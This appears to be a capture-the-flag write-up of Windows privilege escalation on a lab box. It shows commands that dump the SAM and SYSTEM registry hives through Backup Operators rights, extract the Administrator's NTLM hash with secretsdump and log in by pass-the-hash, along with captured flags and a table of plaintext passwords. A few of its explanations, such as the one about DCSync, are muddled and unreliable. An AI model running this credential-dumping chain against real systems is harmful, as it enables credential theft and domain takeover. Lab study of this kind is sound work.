# Privilege Escalation

## Status: ✅ COMPLETE — Administrator (root) achieved 2026-04-02

## Summary
Emily.oscars is a member of **Backup Operators** group, which grants **SeBackupPrivilege** and **SeRestorePrivilege**. These privileges allow reading sensitive registry hives (SAM, SYSTEM, SECURITY) that are normally protected. By dumping the SAM hive, we extracted the Administrator's NTLM hash, then performed a **Pass-the-Hash (PTH)** attack to gain a WinRM shell as Administrator and capture root.txt.

---

## Step 1: WinRM Access as Emily.oscars
- **Date**: 2026-04-02
- **Command**: `evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`
- **Result**: Shell acquired as `cicada\emily.oscars`

## Step 2: User Enumeration
- **Command**: `whoami /groups`
- **Key Finding**: Member of **Backup Operators** (SID S-1-5-32-551)
- **Command**: `whoami /priv`
- **Key Privileges**:
  - `SeBackupPrivilege` — Back up files and directories — **Enabled**
  - `SeRestorePrivilege` — Restore files and directories — **Enabled**
  - SeShutdownPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege

## Step 3: User.txt Captured
- **Command**: `cat C:\Users\emily.oscars.CICADA\Desktop\user.txt`
- **Flag**: `a170fe42ba2d5479cf7a55275e91c3e1`

## Step 4: SAM/SYSTEM Hive Dump via SeBackupPrivilege
- **Date**: 2026-04-02 ~16:17 GMT+8
- **Commands** (run via evil-winrm):
  ```
  reg save HKLM\SAM C:\Users\emily.oscars.CICADA\Documents\SAM
  reg save HKLM\SYSTEM C:\Users\emily.oscars.CICADA\Documents\SYSTEM
  ```
- **Note**: `reg save HKLM\SECURITY` was denied — only SAM and SYSTEM were needed
- **Files**: Downloaded via SMB from `C:\Users\emily.oscars.CICADA\Documents\`
- **Stored**: `loot/SAM` (49,152 bytes), `loot/SYSTEM` (18,530,304 bytes)

## Step 5: Hash Extraction
- **Command**: `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
- **Output**:
  ```
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  ```
- **Administrator NTLM**: `2b87e7c93a3e8a0ea4a581937016f341`
- **No LM hash** (aad3b435b51404eeaad3b435b51404ee = empty LM, common on modern Windows)

## Step 6: Pass-the-Hash to Administrator
- **Command**: `evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.129.231.149`
- **Result**: WinRM shell as `CICADA\Administrator`

## Step 7: Root.txt Captured
- **Command**: `cat C:\Users\Administrator\Desktop\root.txt`
- **Flag**: `9bef445a9b94a35b877d20fd3de7d781`

---

## How It Works — SeBackupPrivilege Exploitation

### What is SeBackupPrivilege?
Windows has a **Backup Operators** group that grants `SeBackupPrivilege` and `SeRestorePrivilege`. These were designed to allow backup software to read all files for backup purposes, even files the user wouldn't normally have access to.

### Why Does This Work on the Registry?
Normally, `%WINDIR%\System32\Config\SAM` is locked and cannot be read by regular administrators. However, the `SeBackupPrivilege` flag causes Windows to allow **file-read access** to these registry hives when accessed through the registry API (reg.exe, regedit, etc.) — because a backup operator needs to be able to back up the SAM hive.

### The Attack Flow
1. **SeBackupPrivilege + reg save**: `reg save HKLM\SAM C:\file` bypasses ACL checks because the privilege treats it as a "backup operation"
2. **SAM contains NTLM hashes**: The local SAM hive stores hashed passwords for all local accounts
3. **Administrator hash → PTH**: With the Administrator's NTLM hash, we authenticate without knowing the plaintext password (Pass-the-Hash)
4. **Administrator = Domain Administrator** on this DC — full domain compromise

### Why `reg save HKLM\SECURITY` Failed
The SECURITY hive (which stores LSA secrets including cached domain credentials) requires **higher privileges** than the standard Backup Operator role provides. SAM and SYSTEM were sufficient for local account extraction.

---

## Current Position
- **User**: Administrator (CICADA-DC local admin, equivalent to Domain Admin on this DC)
- **User.txt**: ✅ `a170fe42ba2d5479cf7a55275e91c3e1`
- **Root.txt**: ✅ `9bef445a9b94a35b877d20fd3de7d781`
- **Box Status**: 🔴 pwned

---

## Credentials Summary (Updated)
| User | Hash/PLAIN | Source | Status |
|------|-----------|--------|--------|
| Administrator | `2b87e7c93a3e8a0ea4a581937016f341` (NTLM) | SAM dump | ✅ PTH works |
| emily.oscars | `Q!3@Lp#M6b*7t*Vt` | Backup_script.ps1 | ✅ WinRM confirmed |
| david.orelious | `aRt$Lp#7t*VQ!3` | AD description field | Valid |
| michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` | HR share | Valid |

## Loot
| File | Size | Contents |
|------|------|----------|
| `loot/SAM` | 49,152 bytes | Registry hive — local SAM database |
| `loot/SYSTEM` | 18,530,304 bytes | Registry hive — SYSTEM (bootkey) |
| `loot/cmd_20260402_162035.log` | — | secretsdump command log |

## Lessons
- **SeBackupPrivilege is dangerous**: Members of Backup Operators can dump SAM/SYSTEM via `reg save` even without admin rights
- **Pass-the-Hash**: Knowing the NTLM hash is equivalent to knowing the password — no cracking needed
- **Backup Operators = instant SYSTEM on DCs**: On a Domain Controller, Backup Operators can extract krbtgt and Domain Admin hashes
- **SAM ≠ Domain hash**: For domain accounts, you'd need DCSync (via SeBackupPrivilege on a DC) — but local SAM gives you the local Administrator
- **SECURITY hive requires higher privilege**: SAM+SYSTEM gives local accounts; SECURITY would expose cached domain credentials and LSA secrets
